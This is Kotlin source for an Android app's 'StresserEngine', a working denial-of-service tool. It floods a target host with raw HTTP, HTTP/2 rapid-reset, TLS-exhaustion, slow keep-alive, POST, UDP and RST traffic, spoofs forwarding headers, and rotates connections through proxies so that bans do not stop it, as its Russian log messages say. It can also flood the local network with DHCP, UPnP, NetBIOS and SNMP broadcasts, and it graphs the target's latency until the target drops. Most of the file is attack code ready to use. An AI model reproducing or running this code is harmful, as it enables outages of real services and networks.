package com.toolkit.app

import androidx.compose.animation.core.animateFloatAsState
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.Path
import androidx.compose.ui.graphics.StrokeCap
import androidx.compose.ui.graphics.drawscope.Fill
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.drawText
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.rememberTextMeasurer
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.toolkit.app.ui.Accent
import com.toolkit.app.ui.AccentSoft
import com.toolkit.app.ui.BorderGlass
import com.toolkit.app.ui.GlassCard
import com.toolkit.app.ui.OkGreen
import com.toolkit.app.ui.TextDim
import com.toolkit.app.ui.TextMain
import com.toolkit.app.ui.WarnOrange
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.Inet4Address
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.Socket
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import javax.net.ssl.SSLContext
import javax.net.ssl.SSLSocket
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import java.security.SecureRandom
import java.security.cert.X509Certificate
import kotlin.concurrent.thread
import kotlin.math.max
import kotlin.math.min

data class StresserSnapshot(
    val downKBs: Float = 0f,
    val upKBs: Float = 0f,
    val pingMs: Float = 0f,
    val liveConns: Int = 0,
    val okRate: Float = 100f,
    val dropped: Boolean = false,
)

class StresserEngine(
    private val host: String,
    private val port: Int = 80,
    private val withBroadcast: Boolean = false,
    private val proxies: List<ProxyEndpoint> = emptyList(),
    private val onMetrics: (StresserSnapshot) -> Unit,
    private val onLog: (String, Color) -> Unit,
    private val onDrop: () -> Unit,
) {
    private val running = AtomicBoolean(false)
    private val sent = AtomicLong(0)
    private val recv = AtomicLong(0)
    private val live = AtomicInteger(0)
    private val okCount = AtomicLong(0)
    private val failCount = AtomicLong(0)
    private val pingFails = AtomicInteger(0)
    @Volatile var lastPing = 0f
        private set
    @Volatile var dropped = false
        private set
    val pingHistory: List<Float>
        get() = synchronized(historyLock) { ArrayList(history) }
    private val historyLock = Any()
    private val history = ArrayList<Float>()
    private val pool = Collections.synchronizedSet(HashSet<Socket>())
    private val workers = ArrayList<Thread>()
    private val trustAll = arrayOf<TrustManager>(object : X509TrustManager {
        override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
        override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
    })

    private val uas = arrayOf(
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36 Edg/126.0",
    )
    private val paths = arrayOf(
        "/", "/index.html", "/index.php", "/home", "/login", "/api", "/api/v1/", "/search",
        "/products", "/en/", "/ru/", "/wp-admin/", "/catalog/", "/news/", "/about/", "/contact",
    )
    private val methods = arrayOf("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD")

    fun start() {
        if (running.getAndSet(true)) return
        onLog(
            "Комбинированный флуд (RAW HTTP + HTTP/2 RST + TLS CPU/RAM + HEAD + TCP/UDP), цель $host:$port",
            Accent,
        )
        if (proxies.isNotEmpty()) {
            onLog(
                "Поток через ${proxies.size} прокси параллельно — ротация на каждом соединении, бан не остановит",
                Accent,
            )
        }
        fun go(block: () -> Unit) {
            val t = thread(isDaemon = true, name = "stress-worker") {
                try {
                    block()
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                }
            }
            workers.add(t)
        }
        if (withBroadcast) {
            for (i in 0 until 12) go { broadcastWorker(67, ::dhcpPacket) }
            for (i in 0 until 12) go { broadcastWorker(1900, ::upnpMsg) }
            for (i in 0 until 12) go { broadcastWorker(137, ::netbiosQuery) }
            for (i in 0 until 12) go { broadcastWorker(161, ::snmpPdu) }
        }
        val churnN = if (withBroadcast) 16 else 24
        val keepN = if (withBroadcast) 8 else 10
        val sslN = if (withBroadcast) 6 else 14
        val tlsRamN = if (withBroadcast) 4 else 12
        val h2N = if (withBroadcast) 0 else 12
        val headN = if (withBroadcast) 10 else 14
        val postN = if (withBroadcast) 8 else 14
        val udpN = if (withBroadcast) 10 else 8
        val udpRandN = if (withBroadcast) 14 else 16
        val rstN = if (withBroadcast) 20 else 24
        val dlN = if (withBroadcast) 8 else 10
        for (i in 0 until churnN) go { churnWorker() }
        for (i in 0 until keepN) go { keepAliveWorker() }
        for (i in 0 until sslN) go { sslWorker() }
        for (i in 0 until tlsRamN) go { tlsRamWorker() }
        for (i in 0 until h2N) go { h2RstWorker() }
        for (i in 0 until headN) go { headWorker() }
        for (i in 0 until postN) go { postFloodWorker() }
        for (i in 0 until udpN) go { udpWorker(port) }
        for (i in 0 until udpRandN) go { udpRandWorker() }
        for (i in 0 until rstN) go { rstWorker() }
        for (i in 0 until dlN) go { downloadWorker() }
        go { pingLoop() }
        go { snapshotLoop() }
    }

    fun stop() {
        if (!running.getAndSet(false)) return
        onLog("Останавливаю…", WarnOrange)
        synchronized(pool) {
            pool.forEach { runCatching { it.close() } }
            pool.clear()
        }
        workers.forEach { runCatching { it.join(1500) } }
        workers.clear()
        onLog("Остановлено", OkGreen)
    }

    private fun tcpConnect(): Socket? {
        synchronized(pool) {
            if (pool.size >= 300) {
                Thread.sleep(50)
                return null
            }
        }
        return try {
            val s = if (proxies.isNotEmpty()) {
                tunnel(proxies[Random().nextInt(proxies.size)])
            } else {
                val t = Socket()
                t.tcpNoDelay = true
                t.connect(InetSocketAddress(host, port), 3000)
                t
            }
            live.incrementAndGet()
            okCount.incrementAndGet()
            synchronized(pool) { pool.add(s) }
            s
        } catch (e: Throwable) {
            failCount.incrementAndGet()
            null
        }
    }

    private fun tunnel(p: ProxyEndpoint): Socket {
        val s = Socket()
        s.tcpNoDelay = true
        s.connect(InetSocketAddress(p.host, p.port), 3000)
        if (p.kind == "socks5") socks5Connect(s, p) else httpConnect(s, p)
        return s
    }

    private fun socks5Connect(s: Socket, p: ProxyEndpoint) {
        val os = s.getOutputStream()
        val ins = s.getInputStream()
        val auth = p.user != null
        os.write(if (auth) byteArrayOf(0x05, 0x02, 0x00, 0x02) else byteArrayOf(0x05, 0x01, 0x00))
        os.flush()
        val ver = ByteArray(2)
        readFully(ins, ver)
        if (ver[0] != 0x05.toByte()) throw java.io.IOException("socks5 bad version")
        if (auth && ver[1] == 0x02.toByte()) {
            val u = p.user!!.toByteArray(Charsets.UTF_8)
            val pw = (p.pass ?: "").toByteArray(Charsets.UTF_8)
            os.write(byteArrayOf(0x01, u.size.toByte()) + u + byteArrayOf(pw.size.toByte()) + pw)
            os.flush()
            val st = ByteArray(2)
            readFully(ins, st)
            if (st[1] != 0x00.toByte()) throw java.io.IOException("socks5 auth failed")
        }
        val hostB = host.toByteArray(Charsets.UTF_8)
        val req = java.io.ByteArrayOutputStream()
        req.write(byteArrayOf(0x05, 0x01, 0x00))
        val ipv4 = runCatching { InetAddress.getByName(host) }.getOrNull()
            ?.takeIf { it is Inet4Address }
            ?.address
        if (ipv4 != null) {
            req.write(0x01)
            req.write(ipv4)
        } else {
            req.write(0x03)
            req.write(hostB.size)
            req.write(hostB)
        }
        req.write(byteArrayOf((port ushr 8).toByte(), port.toByte()))
        os.write(req.toByteArray())
        os.flush()
        val rep = ByteArray(4)
        readFully(ins, rep)
        if (rep[1] != 0x00.toByte()) throw java.io.IOException("socks5 connect refused")
        when (rep[3]) {
            0x01.toByte() -> { val t = ByteArray(6); readFully(ins, t) }
            0x03.toByte() -> { val len = ins.read(); if (len < 0) throw java.io.IOException("socks5 eof"); val t = ByteArray(len + 2); readFully(ins, t) }
            0x04.toByte() -> { val t = ByteArray(18); readFully(ins, t) }
        }
    }

    private fun httpConnect(s: Socket, p: ProxyEndpoint) {
        val authH = if (p.user != null)
            "Proxy-Authorization: Basic ${basicAuth(p.user, p.pass ?: "")}\r\n" else ""
        val req = "CONNECT $host:$port HTTP/1.1\r\nHost: $host:$port\r\n$authH\r\n"
        val os = s.getOutputStream()
        os.write(req.toByteArray(Charsets.UTF_8))
        os.flush()
        s.soTimeout = 4000
        val ins = s.getInputStream()
        val status = readLine(ins)
        if (status == null || !status.contains(" 200 ")) throw java.io.IOException("proxy connect failed: $status")
        while (true) {
            val l = readLine(ins) ?: break
            if (l.isEmpty()) break
        }
        s.soTimeout = 0
    }

    private fun readLine(ins: java.io.InputStream): String? {
        val sb = StringBuilder()
        while (true) {
            val b = ins.read()
            if (b < 0) return if (sb.isEmpty()) null else sb.toString()
            if (b == '\n'.code) return sb.toString().trimEnd('\r')
            sb.append(b.toChar())
        }
    }

    private fun readFully(ins: java.io.InputStream, buf: ByteArray) {
        var off = 0
        while (off < buf.size) {
            val n = ins.read(buf, off, buf.size - off)
            if (n < 0) throw java.io.IOException("eof")
            off += n
        }
    }

    private fun tlsSocket(ctx: SSLContext): SSLSocket? {
        return try {
            val ssl = if (proxies.isNotEmpty()) {
                val raw = tunnel(proxies[Random().nextInt(proxies.size)])
                ctx.socketFactory.createSocket(raw, host, port, true) as SSLSocket
            } else {
                val s = ctx.socketFactory.createSocket() as SSLSocket
                s.tcpNoDelay = true
                s.connect(InetSocketAddress(host, port), 3000)
                s
            }
            ssl.tcpNoDelay = true
            ssl.startHandshake()
            live.incrementAndGet()
            okCount.incrementAndGet()
            synchronized(pool) { pool.add(ssl) }
            ssl
        } catch (t: Throwable) {
            failCount.incrementAndGet()
            null
        }
    }

    private fun release(s: Socket?) {
        if (s == null) return
        runCatching { s.close() }
        synchronized(pool) { pool.remove(s) }
        live.decrementAndGet()
    }

    private fun spoofIp(): String =
        "${11 + Random().nextInt(212)}.${Random().nextInt(256)}.${Random().nextInt(256)}.${1 + Random().nextInt(254)}"

    private fun headers(head: String, rnd: Random, body: Boolean = false): String {
        val ip = spoofIp()
        val h = head +
            "Host: $host\r\n" +
            "User-Agent: ${uas[rnd.nextInt(uas.size)]}\r\n" +
            "X-Forwarded-For: $ip\r\n" +
            "X-Real-IP: $ip\r\n" +
            "CF-Connecting-IP: $ip\r\n" +
            "True-Client-IP: $ip\r\n" +
            "X-Client-IP: $ip\r\n" +
            "X-Originating-IP: $ip\r\n" +
            "Forwarded: for=$ip;proto=http\r\n" +
            "Referer: https://$host/${paths[rnd.nextInt(paths.size)]}\r\n" +
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
            "Accept-Encoding: gzip, deflate, br\r\n" +
            "Cache-Control: no-cache\r\n" +
            "Pragma: no-cache\r\n" +
            "Connection: Keep-Alive\r\n"
        return if (body) h + "Content-Type: application/x-www-form-urlencoded\r\n" else h
    }

    private fun churnWorker() {
        val rnd = Random()
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val q = rnd.nextInt(99999999)
                    val m = methods[rnd.nextInt(methods.size)]
                    val pth = paths[rnd.nextInt(paths.size)]
                    val head = headers("$m $pth?$q HTTP/1.1\r\n", rnd).toByteArray()
                    val out = s.getOutputStream()
                    out.write(head)
                    sent.addAndGet(head.size.toLong())
                    for (i in 0 until 2) {
                        val extra = ("$m $pth?x=$q&$i HTTP/1.1\r\nHost: $host\r\n" +
                            "User-Agent: ${uas[rnd.nextInt(uas.size)]}\r\n" +
                            "X-Forwarded-For: ${spoofIp()}\r\nConnection: Keep-Alive\r\n\r\n").toByteArray()
                        out.write(extra)
                        sent.addAndGet(extra.size.toLong())
                    }
                    s.soTimeout = 1200
                    val buf = ByteArray(4096)
                    val got = s.getInputStream().read(buf)
                    if (got > 0) recv.addAndGet(got.toLong())
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun headWorker() {
        val rnd = Random()
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val q = rnd.nextInt(99999999)
                    val head = headers("HEAD /$q HTTP/1.1\r\n", rnd).toByteArray()
                    s.getOutputStream().write(head)
                    sent.addAndGet(head.size.toLong())
                    s.soTimeout = 1200
                    val buf = ByteArray(2048)
                    val got = s.getInputStream().read(buf)
                    if (got > 0) recv.addAndGet(got.toLong())
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun keepAliveWorker() {
        val rnd = Random()
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val head = headers("GET /?KA=${rnd.nextInt(999999)} HTTP/1.1\r\nKeep-Alive: 300\r\n", rnd).toByteArray()
                    s.getOutputStream().write(head)
                    sent.addAndGet(head.size.toLong())
                    s.soTimeout = 20000
                    val buf = ByteArray(1024)
                    var last = System.currentTimeMillis()
                    while (running.get()) {
                        val now = System.currentTimeMillis()
                        if (now - last > 5000) {
                            val ping = "X-ignore: ${rnd.nextInt(9999)}\r\n".toByteArray()
                            s.getOutputStream().write(ping)
                            sent.addAndGet(ping.size.toLong())
                            last = now
                        }
                        val got = s.getInputStream().read(buf)
                        if (got <= 0) break
                        recv.addAndGet(got.toLong())
                    }
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun udpWorker(port: Int) {
        val s = DatagramSocket()
        val p = ByteArray(1400)
        Random().nextBytes(p)
        while (running.get()) {
            try {
                s.send(DatagramPacket(p, p.size, InetSocketAddress(host, port)))
                sent.addAndGet(p.size.toLong())
            } catch (t: Throwable) {
            }
        }
        runCatching { s.close() }
    }

    private fun udpRandWorker() {
        val s = DatagramSocket()
        val p = ByteArray(1400)
        Random().nextBytes(p)
        while (running.get()) {
            try {
                val dport = 1 + Random().nextInt(65534)
                s.send(DatagramPacket(p, p.size, InetSocketAddress(host, dport)))
                sent.addAndGet(p.size.toLong())
            } catch (t: Throwable) {
            }
        }
        runCatching { s.close() }
    }

    private fun sslWorker() {
        val rnd = Random()
        val ctx = SSLContext.getInstance("TLS")
        ctx.init(null, trustAll, SecureRandom())
        while (running.get()) {
            val s = tlsSocket(ctx)
            if (s != null) {
                try {
                    val q = rnd.nextInt(999999)
                    val head = headers("GET /?tls=$q HTTP/1.1\r\n", rnd).toByteArray()
                    s.getOutputStream().write(head)
                    sent.addAndGet(head.size.toLong())
                    s.soTimeout = 2000
                    val buf = ByteArray(4096)
                    val got = s.getInputStream().read(buf)
                    if (got > 0) recv.addAndGet(got.toLong())
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun tlsRamWorker() {
        val ctx = SSLContext.getInstance("TLS")
        ctx.init(null, trustAll, SecureRandom())
        while (running.get()) {
            val s = tlsSocket(ctx)
            if (s != null) {
                val end = System.currentTimeMillis() + 3000 + Random().nextInt(5000)
                while (running.get() && System.currentTimeMillis() < end) {
                    Thread.sleep(200)
                }
                release(s)
            }
        }
    }

    private fun h2RstWorker() {
        val ctx = SSLContext.getInstance("TLS")
        ctx.init(null, trustAll, SecureRandom())
        while (running.get()) {
            val s = tlsSocket(ctx)
            if (s != null) {
                try {
                    val os = s.getOutputStream()
                    os.write("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n".toByteArray())
                    os.write(byteArrayOf(0, 0, 0, 0x04, 0, 0, 0, 0, 0))
                    os.flush()
                    var streamId = 1
                    val deadline = System.currentTimeMillis() + 3000
                    while (running.get() && streamId < 0x7FFFFFFF && System.currentTimeMillis() < deadline) {
                        val hd = ByteArray(9)
                        hd[2] = 1
                        hd[3] = 0x01
                        hd[4] = 0x04
                        hd[5] = (streamId ushr 24).toByte()
                        hd[6] = (streamId ushr 16).toByte()
                        hd[7] = (streamId ushr 8).toByte()
                        hd[8] = streamId.toByte()
                        os.write(hd)
                        os.write(0)
                        val rst = ByteArray(13)
                        rst[2] = 4
                        rst[3] = 0x03
                        rst[5] = (streamId ushr 24).toByte()
                        rst[6] = (streamId ushr 16).toByte()
                        rst[7] = (streamId ushr 8).toByte()
                        rst[8] = streamId.toByte()
                        rst[9] = 0
                        rst[10] = 0
                        rst[11] = 0
                        rst[12] = 0x08
                        os.write(rst)
                        streamId += 2
                        sent.addAndGet(24L)
                    }
                    os.flush()
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun postFloodWorker() {
        val rnd = Random()
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val body = ByteArray(2048 + rnd.nextInt(8192))
                    Random().nextBytes(body)
                    val head = headers("POST /?f=${rnd.nextInt(999999)} HTTP/1.1\r\n", rnd, body = true)
                        .plus("Content-Length: ${body.size}\r\n\r\n")
                        .toByteArray()
                    val out = s.getOutputStream()
                    out.write(head)
                    out.write(body)
                    sent.addAndGet((head.size + body.size).toLong())
                    s.soTimeout = 1500
                    val buf = ByteArray(2048)
                    val got = s.getInputStream().read(buf)
                    if (got > 0) recv.addAndGet(got.toLong())
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun broadcastWorker(port: Int, packet: () -> ByteArray) {
        val s = DatagramSocket()
        runCatching { s.broadcast = true }
        while (running.get()) {
            try {
                val p = packet()
                s.send(DatagramPacket(p, p.size, InetSocketAddress("255.255.255.255", port)))
                sent.addAndGet(p.size.toLong())
            } catch (t: Throwable) {
            }
        }
        runCatching { s.close() }
    }

    private fun dhcpPacket(): ByteArray {
        val xid = Random().nextInt()
        val p = ByteArray(28)
        p[0] = 0x01
        p[1] = 0x01
        p[2] = 0x06
        p[3] = 0x00
        p[4] = (xid ushr 24).toByte()
        p[5] = (xid ushr 16).toByte()
        p[6] = (xid ushr 8).toByte()
        p[7] = xid.toByte()
        val rand = ByteArray(20)
        Random().nextBytes(rand)
        System.arraycopy(rand, 0, p, 8, 20)
        return p
    }

    private fun upnpMsg(): ByteArray = ("M-SEARCH * HTTP/1.1\r\n" +
        "HOST: 239.255.255.250:1900\r\n" +
        "MAN: \"ssdp:discover\"\r\n" +
        "MX: 1\r\n" +
        "ST: ssdp:all\r\n\r\n").toByteArray()

    private fun netbiosQuery(): ByteArray = byteArrayOf(
        0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x20, 0x43, 0x4b,
        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        0x00, 0x00, 0x21, 0x00, 0x01,
    )

    private fun snmpPdu(): ByteArray = byteArrayOf(
        0x30, 0x26, 0x02, 0x01, 0x00, 0x04, 0x06,
    ) + "public".toByteArray() + byteArrayOf(
        0xa0.toByte(), 0x1b, 0x02, 0x01, 0x2a, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00,
        0x30, 0x0f, 0x30, 0x0d, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00,
        0x05, 0x00,
    )

    private fun rstWorker() {
        val rnd = Random()
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val m = methods[rnd.nextInt(methods.size)]
                    val b = ("$m /?rst=${rnd.nextInt(999999)} HTTP/1.1\r\nHost: $host\r\n" +
                        "User-Agent: ${uas[rnd.nextInt(uas.size)]}\r\n" +
                        "X-Forwarded-For: ${spoofIp()}\r\n\r\n").toByteArray()
                    s.getOutputStream().write(b)
                    sent.addAndGet(b.size.toLong())
                    s.setSoLinger(true, 0)
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun downloadWorker() {
        val rnd = Random()
        while (running.get()) {
            val s = tcpConnect()
            if (s != null) {
                try {
                    val b = ("GET /?dl=${rnd.nextInt(999999)} HTTP/1.0\r\nHost: $host\r\n" +
                        "User-Agent: ${uas[rnd.nextInt(uas.size)]}\r\nAccept: */*\r\n\r\n").toByteArray()
                    s.getOutputStream().write(b)
                    sent.addAndGet(b.size.toLong())
                    s.soTimeout = 2500
                    val buf = ByteArray(16384)
                    while (running.get()) {
                        val got = s.getInputStream().read(buf)
                        if (got <= 0) break
                        recv.addAndGet(got.toLong())
                    }
                } catch (t: Throwable) {
                    failCount.incrementAndGet()
                } finally {
                    release(s)
                }
            }
        }
    }

    private fun pingLoop() {
        while (running.get()) {
            val t0 = System.currentTimeMillis()
            var ok = false
            var s: Socket? = null
            try {
                s = Socket()
                s.tcpNoDelay = true
                s.connect(InetSocketAddress(host, port), 2500)
                ok = true
            } catch (t: Throwable) {
            } finally {
                runCatching { s?.close() }
            }
            val ms = (System.currentTimeMillis() - t0).toFloat()
            synchronized(historyLock) {
                if (ok) {
                    pingFails.set(0)
                    lastPing = ms
                    history.add(ms)
                } else {
                    val f = pingFails.incrementAndGet()
                    if (f >= 2) {
                        val was = dropped
                        dropped = true
                        if (!was) onDrop()
                    }
                    history.add(-1f)
                }
                if (history.size > 90) history.removeAt(0)
            }
            Thread.sleep(1000)
        }
    }

    private fun snapshotLoop() {
        var lastSent = 0L
        var lastRecv = 0L
        while (running.get()) {
            val s = sent.get()
            val r = recv.get()
            val ok = okCount.get()
            val fail = failCount.get()
            val total = ok + fail
            val pings = pingHistory
            val lastGood = pings.filter { it >= 0 }.lastOrNull() ?: lastPing
            onMetrics(
                StresserSnapshot(
                    downKBs = (r - lastRecv) / 1024f,
                    upKBs = (s - lastSent) / 1024f,
                    pingMs = if (lastGood >= 0) lastGood else 0f,
                    liveConns = live.get(),
                    okRate = if (total > 0) ok * 100f / total else 100f,
                    dropped = dropped,
                )
            )
            lastSent = s
            lastRecv = r
            Thread.sleep(1000)
        }
    }
}

data class LogLine(val text: String, val color: Color)

@Composable
fun animatedSnap(s: StresserSnapshot): StresserSnapshot {
    val down by animateFloatAsState(s.downKBs, tween(600), label = "down")
    val up by animateFloatAsState(s.upKBs, tween(600), label = "up")
    val ping by animateFloatAsState(s.pingMs, tween(600), label = "ping")
    val liveC by animateFloatAsState(s.liveConns.toFloat(), tween(400), label = "live")
    return s.copy(downKBs = down, upKBs = up, pingMs = ping, liveConns = liveC.toInt())
}

@Composable
fun StatTile(modifier: Modifier, label: String, value: String) {
    GlassCard(modifier = modifier) {
        Column(
            Modifier
                .fillMaxWidth()
                .height(58.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center,
        ) {
            Text(label, color = TextDim, fontSize = 10.sp, maxLines = 1)
            Spacer(Modifier.height(3.dp))
            Text(
                value,
                color = TextMain,
                fontSize = 12.sp,
                fontWeight = FontWeight.SemiBold,
                fontFamily = FontFamily.Monospace,
                maxLines = 1,
                softWrap = false,
                overflow = androidx.compose.ui.text.style.TextOverflow.Clip,
                modifier = Modifier.padding(horizontal = 4.dp),
            )
        }
    }
}

fun speedStr(kbs: Float): String {
    if (kbs <= 0f) return "0 КБ/с"
    if (kbs >= 1024f) return "%.1f МБ/с".format(Locale.US, kbs / 1024f)
    return "${kbs.toInt()} КБ/с"
}

@Composable
fun LatencyGraph(history: List<Float>?) {
    val textMeasurer = rememberTextMeasurer()
    val labelStyle = TextStyle(color = TextDim, fontSize = 9.sp)
    Canvas(
        modifier = Modifier
            .fillMaxWidth()
            .height(140.dp),
    ) {
        val pts = history ?: return@Canvas
        val n = pts.size
        val w = size.width
        val h = size.height
        if (n == 0) {
            drawLine(BorderGlass, Offset(0f, h / 2f), Offset(w, h / 2f), strokeWidth = 1.5f)
            return@Canvas
        }
        val from = max(0, n - 60)
        val data = pts.subList(from, n)
        val goodMax = data.filter { it >= 0 }.maxOrNull()
        val maxV = max(50f, goodMax ?: 50f) * 1.15f
        fun xAt(i: Int) = w * (from + i) / 59f
        fun yAt(v: Float) = h - (min(v, maxV) / maxV) * h

        for (g in 0..4) {
            val y = h - h * g / 4f
            drawLine(
                if (g == 0) BorderGlass.copy(alpha = 0.5f) else BorderGlass,
                Offset(0f, y),
                Offset(w, y),
                strokeWidth = if (g == 0) 1.5f else 1f,
            )
            val label = textMeasurer.measure(
                AnnotatedString("${(maxV * g / 4f).toInt()} мс"),
                labelStyle,
            )
            drawText(label, topLeft = Offset(5.dp.toPx(), y - label.size.height - 2.dp.toPx()))
        }
        val timeLabel = textMeasurer.measure(AnnotatedString("60 с"), labelStyle)
        drawText(timeLabel, topLeft = Offset(w - timeLabel.size.width - 5.dp.toPx(), h - timeLabel.size.height - 2.dp.toPx()))

        val goodPts = ArrayList<Offset>(data.size)
        val dropXs = ArrayList<Float>(4)
        data.forEachIndexed { i, v ->
            val x = xAt(i)
            if (v >= 0) goodPts.add(Offset(x, yAt(v))) else dropXs.add(x)
        }

        if (goodPts.isNotEmpty()) {
            val line = Path()
            line.moveTo(goodPts[0].x, goodPts[0].y)
            if (goodPts.size >= 2) {
                for (i in 1 until goodPts.size - 1) {
                    val midX = (goodPts[i].x + goodPts[i + 1].x) / 2f
                    val midY = (goodPts[i].y + goodPts[i + 1].y) / 2f
                    line.quadraticBezierTo(goodPts[i].x, goodPts[i].y, midX, midY)
                }
                line.lineTo(goodPts.last().x, goodPts.last().y)
            }
            val area = Path()
            area.moveTo(goodPts[0].x, h)
            if (goodPts.size >= 2) {
                area.lineTo(goodPts[0].x, goodPts[0].y)
                for (i in 1 until goodPts.size - 1) {
                    val midX = (goodPts[i].x + goodPts[i + 1].x) / 2f
                    val midY = (goodPts[i].y + goodPts[i + 1].y) / 2f
                    area.quadraticBezierTo(goodPts[i].x, goodPts[i].y, midX, midY)
                }
                area.lineTo(goodPts.last().x, goodPts.last().y)
            } else {
                area.lineTo(goodPts[0].x, goodPts[0].y)
            }
            area.lineTo(goodPts.last().x, h)
            area.close()
            drawPath(
                area,
                Brush.verticalGradient(
                    listOf(Accent.copy(alpha = 0.22f), Color.Transparent),
                    startY = 0f,
                    endY = h,
                ),
                style = Fill,
            )
            drawPath(line, Accent, style = Stroke(width = 2.dp.toPx(), cap = StrokeCap.Round, join = androidx.compose.ui.graphics.StrokeJoin.Round))
        }

        dropXs.forEach { x ->
            drawLine(
                Color(0xFFFF6B6B).copy(alpha = 0.5f),
                Offset(x, 0f),
                Offset(x, h),
                strokeWidth = 1.5f,
            )
            drawCircle(Color(0xFFFF6B6B), radius = 3.5.dp.toPx(), center = Offset(x, h - 10.dp.toPx()))
        }

        val last = data.lastOrNull()
        if (last != null && last >= 0) {
            drawCircle(AccentSoft, radius = 4.dp.toPx(), center = Offset(xAt(from + data.size - 1), yAt(last)))
        }
    }
}
